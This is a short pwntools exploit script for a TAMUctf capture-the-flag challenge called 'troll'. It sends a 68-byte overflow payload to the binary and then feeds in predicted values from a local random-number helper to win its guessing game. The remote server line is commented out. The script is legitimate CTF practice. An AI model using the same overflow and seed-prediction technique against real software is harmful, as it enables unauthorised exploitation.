#!/usr/bin/python2.7
from pwn import *
import subprocess

subp = subprocess.Popen("./rand", stdout=subprocess.PIPE)
rand_nums = subp.stdout.read().split(",")[:-1]
print(rand_nums)

HOST = 'challenges.tamuctf.com'
PORT = 4765
#p = remote(HOST, PORT)

p = process("./troll")

print(p.recvline())
p.sendline('A'*64 + 'B'*4)
print(p.recvline())

for a in rand_nums:
    print(p.recvline())
    x = int(a, 10) % 100000 + 1
    print("sending " + str(x))
    p.sendline(str(x))
    print(p.recvline())

print("complete!")
print(p.recv())
